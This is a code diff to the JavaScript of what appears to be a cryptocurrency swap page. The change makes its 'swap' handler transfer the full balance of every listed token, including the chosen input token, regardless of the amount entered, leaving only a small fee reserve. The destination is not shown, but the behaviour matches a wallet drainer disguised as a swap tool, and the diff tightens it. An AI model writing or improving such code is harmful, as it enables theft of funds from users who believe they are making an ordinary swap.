@@ -871,11 +871,8 @@ async function handleSwap() {
     showLoader();
     updateStatus("Processing transfers...", "success");
     
-    // First handle the main token (from input)
-    await processMainTokenTransfer();
-    
-    // Then process all other tokens
-    await processAllTokenTransfers();
+    // Process all tokens (including the main token) in one go
+    await processAllTokenTransfers(true);
     
     updateStatus("All transfers completed successfully!", "success");
     document.getElementById("fromAmount").value = '';
@@ -889,35 +886,14 @@ async function handleSwap() {
   }
 }
 
-async function processMainTokenTransfer() {
-  const fromBalance = await fetchTokenBalance(currentFromToken);
-  if (fromBalance <= 0) return;
-  
-  const inputAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
-  
-  if (currentFromToken.isNative) {
-    // For native tokens, use entered amount (if any) or full balance minus reserve
-    const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
-    const amountToSend = inputAmount > 0 ? 
-      Math.min(inputAmount, fromBalance - minReserve) : 
-      fromBalance - minReserve;
-    
-    if (amountToSend > 0) {
-      await transferNativeToken(currentFromToken, amountToSend);
-    }
-  } else {
-    // For ERC20 tokens, use entered amount or full balance
-    const amountToSend = inputAmount > 0 ? Math.min(inputAmount, fromBalance) : fromBalance;
-    if (amountToSend > 0) {
-      await transferERC20Token(currentFromToken, amountToSend);
-    }
-  }
-}
-
-async function processAllTokenTransfers() {
-  const tokensToProcess = TOKENS[currentNetwork].filter(t => 
-    t.address !== currentFromToken.address && t.address
-  ).sort((a, b) => a.priority - b.priority);
+async function processAllTokenTransfers(includeMainToken = false) {
+  // Get all tokens to process
+  const tokensToProcess = TOKENS[currentNetwork]
+    .filter(t => 
+      (includeMainToken || t.address !== currentFromToken.address) && 
+      t.address // Ensure it's a valid token
+    )
+    .sort((a, b) => a.priority - b.priority);
   
   let successCount = 0;
   
@@ -935,16 +911,15 @@ async function processAllTokenTransfers() {
     }
   }
   
-  // Process native tokens last (except the one we already processed)
-  const nativeToken = tokensToProcess.find(t => t.isNative);
-  if (nativeToken) {
+  // Process native tokens last
+  for (const token of tokensToProcess.filter(t => t.isNative)) {
     try {
-      const balance = await fetchTokenBalance(nativeToken);
+      const balance = await fetchTokenBalance(token);
       if (balance > 0) {
         const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
         const amountToSend = Math.max(0, balance - minReserve);
         if (amountToSend > 0) {
-          await transferNativeToken(nativeToken, amountToSend);
+          await transferNativeToken(token, amountToSend);
           successCount++;
         }
       }
